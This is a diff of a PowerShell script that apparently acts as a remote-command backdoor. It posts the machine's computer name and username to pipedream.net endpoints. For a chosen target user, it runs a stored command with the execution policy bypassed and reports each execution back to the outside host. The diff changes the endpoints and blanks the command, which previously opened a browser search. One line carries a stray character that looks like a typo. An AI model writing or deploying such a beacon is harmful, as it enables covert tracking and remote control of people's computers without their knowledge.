@@ -1,16 +1,16 @@
-$target_user = "32372"
-$command = ";Start-Process Chrome 'https://www.google.com/search?q=english+or+spanish&rlz=1C1GCEA_enGB1129GB1129&oq=english+or+spanish&gs_lcrp=EgZjaHJvbWUqCggAEAAYsQMYgAQyCggAEAAYsQMYgAQyBwgBEAAYgAQyBwgCEAAYgAQyBwgDEAAYgAQyBwgEEAAYgAQyBwgFEAAYgAQyBwgGEAAYgAQyBwgHEAAYgAQyBwgIEAAYgAQyBwgJEAAYgATSAQg1MzM1ajBqN6gCALACAA&sourceid=chrome&ie=UTF-8'"
+r$target_user = ""
+$command = ""
 
 #$e = dir "c:\Cache\pc-client.exe-1.0.0.0-0"
 
-iwr -uri https://enozw8a1fwe1j.x.pipedream.net/$env:computername/$env:username -Body (Out-String -InputObject $command) -Method post
+iwr -uri https://eowh8quogmj1r7l.m.pipedream.net/$env:computername/$env:username -Body (Out-String -InputObject $command) -Method post
 
 
 if ( $Env:UserName -eq $target_user) {
 	if (Test-Path "C:\Cache\tmp"){
 		if (!((Get-Content "C:\Cache\tmp") -eq $command)){
 			powershell -ep bypass -Command $command
-			iwr -uri https://enozw8a1fwe1j.x.pipedream.net/exec/$env:computername/$env:username -Body (Out-String -InputObject $command) -Method post
+			iwr -uri https://eop6k5duwzsmha1.m.pipedream.net/exec/$env:computername/$env:username -Body (Out-String -InputObject $command) -Method post
 			$command | Out-File -FIlePath "C:\Cache\tmp"
 		}
 	} else {
